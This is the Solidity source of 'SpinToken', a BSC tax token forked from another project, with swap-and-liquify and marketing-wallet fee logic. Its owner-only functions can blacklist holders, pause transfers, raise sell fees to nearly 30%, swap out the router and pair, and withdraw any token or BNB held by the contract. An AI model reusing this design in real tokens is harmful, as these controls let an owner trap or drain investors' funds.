/**
SpinToken, fork of RetroDoge, the new way to try your luck
**/

pragma solidity >=0.8.0;
// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "@openzeppelin/contracts/utils/math/SafeCast.sol";
// import "@openzeppelin/contracts/utils/math/SignedSafeMath.sol";

contract SpinToken is ERC20Permit, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private swapping;
    bool public transfersPaused = true;
    bool public transfersPermanentlyUnpaused = false;

    address public _deadWalletAddress = address(0x000000000000000000000000000000000000dEaD);
    address public _marketingWalletAddress = address(0xfea53c78569D4D0a638949d930F05C082F9E316b);
    address public _rewardWalletAddress = address(0x1Cb312EdE3111937E9775D32Dd76373E8D7ae262);
    address public MARKETING_TOKEN = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); //wbnb
    uint256 public swapTokensAtAmount = 5000000 * (10**18);

    mapping(address => bool) public _isBlacklisted;
    // fees use basis points

    uint256 public liquiditySellFee = 200;
    uint256 public marketingSellFee = 1000;
   
    uint256 public totalBuyFees = liquiditySellFee.add(marketingSellFee);
    uint256 public totalSellFees = liquiditySellFee.add(marketingSellFee);
    // Sell fees are only used for collection taxes. Buy fees are the ratios used when the swap threshold is hit.
    uint256 public setratio = 50;
    //ratio governs marketing and reward split. split must be between 1 and 99. 

    string public nah = "the fuck are you doing";

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
    mapping (address => bool) public excludedFromPausedTransfersAndFees;

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event IncludeInFees(address indexed account, bool isExcluded);
    event IncludeMultipleAccountsInFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event FailToSend();

    modifier maxTax(uint256 value) {
        require(value < 3000, nah);
        _;
    }

    constructor() ERC20("SpinToken", "SPIN") ERC20Permit("SpinToken") {
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        excludedFromPausedTransfersAndFees[owner()] = true;
        excludedFromPausedTransfersAndFees[address(this)] = true;
        excludedFromPausedTransfersAndFees[_deadWalletAddress] = true;
        excludedFromPausedTransfersAndFees[_rewardWalletAddress] = true;
        excludedFromPausedTransfersAndFees[_marketingWalletAddress] = true;

        _mint(owner(), 7 * (10**8) * (10**18)); // 700 million total suppply,
    }

    receive() external payable { }

    function marketingIsWETH() public view returns (bool) {
        return MARKETING_TOKEN == uniswapV2Router.WETH();
    }

    function updateUniswapV2Router(address newAddress) external onlyOwner {
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
        try IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()) returns (address _uniswapV2Pair) {
          uniswapV2Pair = _uniswapV2Pair;
        } catch {}
    }

    function setRatioForTransfer(uint256 value) external onlyOwner {
        setratio = value;
    }

    function updateUniswapV2Pair(address newAddress) external onlyOwner {
        uniswapV2Pair = newAddress;
    }

    function setMarketingWallet(address payable wallet) external onlyOwner {
        _marketingWalletAddress = wallet;
    }

    function setrewardWallet(address payable wallet) external onlyOwner {
        _rewardWalletAddress = wallet;
    }


    function setMarketingFee(uint256 value, bool setForSells) external onlyOwner maxTax(value) {
        if (setForSells) {
            marketingSellFee = value;
            updateFees(true);
        } 
    }

    function updateFees(bool sells) internal {
        if (!sells) {
            totalBuyFees = marketingSellFee;
        } else {
            totalSellFees = marketingSellFee;
        }
    }

    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        _setAutomatedMarketMakerPair(pair, value);
    }

    function blacklistAddress(address account, bool value) public onlyOwner {
        _isBlacklisted[account] = value;
    }


    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function flipTransfers(bool permanently) external onlyOwner {
        require(!transfersPermanentlyUnpaused, "can no longer be changed.");
        transfersPaused = !transfersPaused;
        if (permanently) transfersPermanentlyUnpaused = true;
    }

    function excludeFromPaused(address _address, bool value) external onlyOwner {
        excludedFromPausedTransfersAndFees[_address] = value;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], 'Blacklisted address');

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (transfersPaused && !(excludedFromPausedTransfersAndFees[from] || excludedFromPausedTransfersAndFees[to])) revert("transfers paused.");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        // we don't try and do liquidity injection on buys, but we still take taxes.
        if (canSwap && !swapping && !automatedMarketMakerPairs[from] && from != owner() && to != owner() && !excludedFromPausedTransfersAndFees[from] && !excludedFromPausedTransfersAndFees[to]) {
            swapping = true;

             uint256 marketingTokens = contractTokenBalance.mul(marketingSellFee).div(totalBuyFees);

            if (marketingTokens != 0) swapAndSendToMarketing(marketingTokens);

            //liquidity injection is done last, and gets whatever tokens are remaining.
            uint256 liquidityTokens = balanceOf(address(this));
            if (liquidityTokens != 0) swapAndLiquify(liquidityTokens);

            swapping = false;
        }

        // decide whether we can take fees
        bool canTakeFee = !swapping;
        if (excludedFromPausedTransfersAndFees[from] || excludedFromPausedTransfersAndFees[to]) canTakeFee = false;

        // decide which fees to take - default to 0 if not a buy/sell.
        if (canTakeFee) {
            uint256 fees;
            if (automatedMarketMakerPairs[from]) { //buy
                fees = amount.mul(totalBuyFees).div(10000);
            } else if (automatedMarketMakerPairs[to]) { //sell
                fees = amount.mul(totalSellFees).div(10000);
            } else {
                fees = 0;
            }
            amount = amount - fees;
            if (fees != 0) super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }


    function swapAndSendToMarketing(uint256 tokens) private  {
        uint256 initialTOKENBalance = IERC20(MARKETING_TOKEN).balanceOf(address(this));
        swapTokensForTokens(tokens, MARKETING_TOKEN);
        uint256 newBalance = IERC20(MARKETING_TOKEN).balanceOf(address(this)) - initialTOKENBalance;
        //split newbalance into uneven halves
        uint256 marketBalance = (newBalance.div(100).mul(setratio));
        uint256 rewardBalance = (newBalance - marketBalance);


        IERC20(MARKETING_TOKEN).transfer(_marketingWalletAddress, marketBalance);
        //alt market wallet 
        IERC20(MARKETING_TOKEN).transfer(_rewardWalletAddress, rewardBalance);
    }


    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // swap creates, and not make the liquidity event include any ETH that this is so that we can capture exactly the amount of ETH that the
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }


    function swapTokensForEth(uint256 tokenAmount) private {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function swapTokensForTokens(uint256 tokenAmount, address tokenAddress) private {
        //handle situation where we don't actually want to Swap
        if (tokenAmount == 0) {
          return;
        }

        address[] memory path;
        if (marketingIsWETH() && tokenAddress == MARKETING_TOKEN) {

            // Swap for ETH
            uint256 oldEthBalance = address(this).balance;
            swapTokensForEth(tokenAmount);
            uint256 newEthBalance = address(this).balance.sub(oldEthBalance); 

            // Wrap back to WETH
            (bool wethsuccess, ) = uniswapV2Router.WETH().call{value: newEthBalance}("");
            require(wethsuccess, "wrap failed.");

        } else {
            path = new address[](3);
            path[0] = address(this);
            path[1] = uniswapV2Router.WETH();
            path[2] = tokenAddress;

            _approve(address(this), address(uniswapV2Router), tokenAmount);

            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }

    // Emergency only - Recover Tokens
    function recoverToken(address _token, uint256 amount) external virtual onlyOwner {
        IERC20(_token).transfer(owner(), amount);
    }

    // Emergency only - Recover BNB
    function recoverBNB(address payable to, uint256 amount) external onlyOwner {
        to.transfer(amount);
    }

    function setMarketingToken(address newToken) external onlyOwner {
        MARKETING_TOKEN = newToken;
    }

    function setSwapAtBalance(uint256 newSwapAtAmount) external onlyOwner {
        swapTokensAtAmount = newSwapAtAmount;
    }
}